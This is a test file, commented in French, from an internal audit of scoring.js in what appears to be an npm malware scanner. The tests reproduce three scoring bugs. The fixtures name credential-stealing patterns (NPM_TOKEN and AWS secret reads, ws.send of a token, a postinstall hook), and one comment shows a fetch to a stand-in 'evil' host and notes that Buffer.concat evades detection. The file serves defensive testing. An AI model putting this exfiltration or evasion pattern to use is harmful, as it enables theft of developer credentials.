// Audit interne 2026-05-17 — Phase 1a scoring.js — Tests reproducteurs des 3 findings Critical.
//
// CONVENTION : chaque test asserts le comportement BUGGUÉ actuel.
// - Test PASSE aujourd'hui = bug confirmé existant
// - Test ÉCHOUERA après le fix prévu = correction validable
//
// Standalone — pas intégré au run-tests.js master pour respecter la discipline audit
// "0 code change pendant l'audit, sauf typos < 5 lignes". Lancement :
//   node tests/audit-2026-05/scoring-critical-findings.test.js
//
// Rapport : muaddib-prompt-docs/archive/audits/2026-05-internal-v2.11.15.md
//
// Auteur : Claude Opus 4.7 (1M context) sous direction Kéwin Poszalski
// Date : 2026-05-17

// Force offline scoring (no npm registry fetch during tests)
if (!process.env.MUADDIB_NO_REGISTRY_FETCH) {
  process.env.MUADDIB_NO_REGISTRY_FETCH = '1';
}
// Force the buggy default for SC-C1 — DO NOT set MUADDIB_COMPOUND_REPLACE
delete process.env.MUADDIB_COMPOUND_REPLACE;

const {
  applyFPReductions,
  applyCompoundBoosts,
  computeGroupScore,
  computeGroupScoreDecay,
} = require('../../src/scoring.js');

let passed = 0;
let failed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    console.log(`  [PASS] ${name}`);
    passed++;
  } catch (e) {
    console.log(`  [FAIL] ${name}`);
    console.log(`         ${e.message}`);
    failures.push({ name, error: e.message });
    failed++;
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

function assertEq(actual, expected, msg) {
  if (actual !== expected) {
    throw new Error(`${msg || 'assertEq'}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

console.log('=== AUDIT 2026-05 Phase 1a — scoring.js CRITICAL findings ===');
console.log('');
console.log('Chaque test asserts le BUG actuel. PASS aujourd\'hui = bug existant.');
console.log('Après le fix prévu, ces tests doivent FAIL (= correction prouvée).');
console.log('');

// ──────────────────────────────────────────────────────────────────────────
// SC-C1 — MUADDIB_COMPOUND_REPLACE not default ON → constituents NOT marked
// ──────────────────────────────────────────────────────────────────────────
console.log('\n--- SC-C1: Compound replace gate default OFF ---');

// SC-C1.a removed (remédiation 2026-07): it asserted `MUADDIB_COMPOUND_REPLACE !== '1'`
// right after the harness `delete process.env.MUADDIB_COMPOUND_REPLACE` — a tautology on
// its own setup, AND the env-var gate itself is gone (scoring.js:252-256: the compound tag
// is now honored unconditionally). Nothing left to assert.

test('SC-C1.b: applyCompoundBoosts marque les constituents et le tag est honoré par le scoring (FIXED)', () => {
  // Le tag replacedByCompound est désormais honoré INCONDITIONNELLEMENT par le
  // scoring (scoring.js:252-256, l'ancien gate env-var MUADDIB_COMPOUND_REPLACE est
  // supprimé). SC-C1.c le prouve : plus de double-count.
  const threats = [
    { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall: node hook.js' },
    { type: 'typosquat_detected', severity: 'CRITICAL', file: 'package.json', message: 'Package "expres" resembles "express" (distance 1)' }
  ];

  applyCompoundBoosts(threats, '/fake/path');

  const compound = threats.find(t => t.type === 'lifecycle_typosquat');
  assert(compound, 'Compound lifecycle_typosquat doit être injecté');

  // Le tagging FONCTIONNE (constituents marqués)
  const lifecycle = threats.find(t => t.type === 'lifecycle_script');
  // Note : typosquat_detected est CRITICAL = même rang que le compound, donc PAS tagué
  // (la logique `instSevRank < compoundSevRank` skip les peers).
  // Lifecycle est MEDIUM < CRITICAL → tagué.
  assertEq(
    lifecycle.replacedByCompound,
    'lifecycle_typosquat',
    'Lifecycle (MEDIUM) doit être tagué avec replacedByCompound (compound CRITICAL > MEDIUM)'
  );

  // Le tag est honoré par le scoring ; SC-C1.c prouve l'absence de double-count.
});

test('SC-C1.c: computeGroupScore ne double-compte plus les constituents d\'un compound (FIXED)', () => {
  // Cas concret : un fichier émet env_access + suspicious_module_sink
  // → compound websocket_credential_exfil (CRITICAL) injecté
  // Score buggué : compound (25) + env_access (10 si HIGH) + suspicious_module_sink (10 si HIGH) = 45
  // Score attendu après fix : compound seul (25) car constituents suppressed
  const threats = [
    { type: 'env_access', severity: 'HIGH', file: 'src/exfil.js', message: 'process.env.NPM_TOKEN' },
    { type: 'suspicious_module_sink', severity: 'HIGH', file: 'src/exfil.js', message: 'ws.send(token)' }
  ];

  applyCompoundBoosts(threats, '/fake/path');

  // Force sum-of-weights mode for predictable assertion
  process.env.MUADDIB_DECAY = '0';
  const score = computeGroupScore(threats);
  delete process.env.MUADDIB_DECAY;

  // FIXED : les constituents (env_access + suspicious_module_sink) sont supprimés
  // par le tag replacedByCompound, donc le score reflète le compound SEUL (≈25),
  // pas la somme buggée ~45. On borne à <=25 pour prouver l'absence de double-count.
  assert(
    score <= 25 && score >= 15,
    `FIXED : score=${score}, attendu ≈25 (compound seul, constituents supprimés). Un score >25 signifierait un double-count régressé.`
  );
});

// ──────────────────────────────────────────────────────────────────────────
// SC-C2 — credential_regex_harvest no dilution floor → exploitable
// ──────────────────────────────────────────────────────────────────────────
console.log('\n--- SC-C2: credential_regex_harvest no dilution floor ---');

// SC-C2.a removed: it was a documentary assert(true) with no behavioral check. The dilution-
// floor exclusion of credential_regex_harvest (no `from` field → not restored) is proven
// behaviorally by SC-C2.b below, which is the real test.

test('SC-C2.b: 4 credential_regex_harvest tous downgraded LOW (pas de floor)', () => {
  // Scénario : malware avec 1 vrai pattern d'exfil + 3 patterns benign de header parsing.
  // Tous les 4 sont initialement HIGH severity.
  // Comptage : 4 > maxCount=2 → tous downgraded LOW.
  // Floor : pas applicable (pas de `from` field) → AUCUN restored.
  const threats = [
    { type: 'credential_regex_harvest', severity: 'HIGH', file: 'src/exfil.js', message: 'regex AWS_SECRET_KEY' },
    { type: 'credential_regex_harvest', severity: 'HIGH', file: 'src/headers.js', message: 'regex Authorization Bearer' },
    { type: 'credential_regex_harvest', severity: 'HIGH', file: 'src/headers.js', message: 'regex Cookie session' },
    { type: 'credential_regex_harvest', severity: 'HIGH', file: 'src/headers.js', message: 'regex X-Forwarded-For' },
  ];

  applyFPReductions(threats, null, 'test-pkg', {});

  const lows = threats.filter(t => t.severity === 'LOW');
  const highs = threats.filter(t => t.severity === 'HIGH');

  // BUG: tous downgraded à LOW
  assertEq(lows.length, 4, `BUG-CONFIRMED: tous 4 credential_regex_harvest sont LOW (count=${lows.length}). Après fix avec dilution floor, 1 doit rester à HIGH.`);
  assertEq(highs.length, 0, `Aucun HIGH restored (count_threshold_floor exige rule.from, manque ici)`);
});

test('SC-C2.c: suspicious_dataflow — le dilution floor restaure 1 instance à MEDIUM (FIXED)', () => {
  // suspicious_dataflow a `{ maxCount: 3, to: 'LOW' }`. Le dilution floor restaure
  // désormais UNE instance à sa sévérité d'origine (MEDIUM) au lieu de tout écraser
  // en LOW — 4 LOW + 1 MEDIUM.
  const threats = Array.from({ length: 5 }, (_, i) => ({
    type: 'suspicious_dataflow',
    severity: 'MEDIUM',
    file: `src/file${i}.js`,
    message: 'data flows from process.env to fetch'
  }));

  applyFPReductions(threats, null, 'test-pkg', {});

  const lows = threats.filter(t => t.severity === 'LOW');
  const meds = threats.filter(t => t.severity === 'MEDIUM');
  assertEq(lows.length, 4, `FIXED : 4 des 5 suspicious_dataflow en LOW (1 restauré par le floor).`);
  assertEq(meds.length, 1, `FIXED : 1 suspicious_dataflow restauré à MEDIUM (dilution floor).`);
});

// ──────────────────────────────────────────────────────────────────────────
// SC-C3 — env_access not in LIFECYCLE_GUARD_TYPES
// ──────────────────────────────────────────────────────────────────────────
console.log('\n--- SC-C3: env_access lifecycle guard missing ---');

test('SC-C3.a: env_access count > 4 sans lifecycle_script → tous LOW', () => {
  // Sanity check : 5+ env_access threats, sans lifecycle, sans network sink.
  // Count threshold : 5 > maxCount=4 → tous HIGH→LOW.
  const threats = Array.from({ length: 5 }, (_, i) => ({
    type: 'env_access',
    severity: 'HIGH',
    file: 'src/config.js',
    message: `process.env.VAR_${i}`
  }));

  applyFPReductions(threats, null, 'test-pkg', {});

  const lows = threats.filter(t => t.severity === 'LOW');
  assertEq(lows.length, 5, 'Sanity check : 5 env_access HIGH → tous downgraded LOW');
});

test('SC-C3.b: env_access count > 4 AVEC lifecycle_script → lifecycle_guard NE restore AUCUN env_access', () => {
  // Scénario : malware lifecycle + 5+ env_access = pattern Mini Shai-Hulud.
  // LIFECYCLE_GUARD_TYPES (scoring.js:1187) restore UNE instance par type pour :
  //   {obfuscation_detected, dynamic_require, dangerous_call_function, dangerous_call_eval, staged_payload}
  // env_access NON présent → aucun restore.
  //
  // Aucun network sink dans le même fichier → B5 networkSinkFiles immunity échoue.
  const threats = [
    {
      type: 'lifecycle_script',
      severity: 'MEDIUM',
      file: 'package.json',
      message: 'postinstall: node hook.js'
    },
    ...Array.from({ length: 5 }, (_, i) => ({
      type: 'env_access',
      severity: 'HIGH',
      file: 'src/hook.js',  // pas de network sink détecté dans ce fichier
      message: `process.env.${['HOME', 'NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY', 'AWS_SECRET'][i]}`
    }))
  ];

  applyFPReductions(threats, null, 'test-pkg', {});

  const envAccessThreats = threats.filter(t => t.type === 'env_access');
  const envLows = envAccessThreats.filter(t => t.severity === 'LOW');
  const envHighOrMed = envAccessThreats.filter(t => t.severity === 'HIGH' || t.severity === 'MEDIUM');

  // FIXED : env_access est désormais dans LIFECYCLE_GUARD_TYPES (scoring.js:1469-1471),
  // donc 1 instance est restaurée quand un lifecycle_script est présent → 4 LOW + 1 restauré.
  assertEq(envLows.length, 4, `FIXED : 4 des 5 env_access en LOW (1 restauré par le lifecycle_guard).`);
  assertEq(envHighOrMed.length, 1, `FIXED : 1 env_access restauré (MEDIUM/HIGH) car env_access ∈ LIFECYCLE_GUARD_TYPES.`);
});

test('SC-C3.c: networkSinkFiles immunity échoue si POST direct sans pattern dataflow', () => {
  // Scénario : un malware fait `fetch('https://evil', { body: JSON.stringify(creds) })`
  // mais le dataflow scanner ne déclenche PAS de suspicious_dataflow / suspicious_module_sink
  // pour ce pattern (par exemple parce que body est construit via Buffer.concat).
  // Donc networkSinkFiles est vide pour ce fichier → env_access immunity échoue.
  const threats = Array.from({ length: 5 }, (_, i) => ({
    type: 'env_access',
    severity: 'HIGH',
    file: 'src/exfil.js',
    message: `process.env.VAR_${i}`
  }));
  // Note : pas de suspicious_dataflow / suspicious_module_sink dans threats[]
  // donc networkSinkFiles est vide

  applyFPReductions(threats, null, 'test-pkg', {});

  const lows = threats.filter(t => t.severity === 'LOW');
  assertEq(lows.length, 5, `BUG-CONFIRMED: networkSinkFiles vide → aucune immunity → tous env_access LOW. Real attacker fetch+Buffer.concat ne déclenche pas dataflow scanner → exfil masqué.`);
});

// ──────────────────────────────────────────────────────────────────────────
// Summary
// ──────────────────────────────────────────────────────────────────────────
console.log('');
console.log(`========================================`);
console.log(`RESULTS: ${passed} passed, ${failed} failed`);
console.log(`========================================`);

if (failed > 0) {
  console.log('');
  console.log('Failures (= bugs NOT confirmed by current code) :');
  for (const f of failures) {
    console.log(`  - ${f.name}`);
    console.log(`    ${f.error}`);
  }
  process.exit(1);
}

console.log('');
console.log('All tests PASSED → 3 Critical bugs (SC-C1, SC-C2, SC-C3) CONFIRMED existant en v2.11.15.');
console.log('');
console.log('Après les fixes prévus, ces tests doivent ÉCHOUER (= correction validée).');
console.log('Voir backlog dans archive/audits/2026-05-internal-v2.11.15.md.');
process.exit(0);
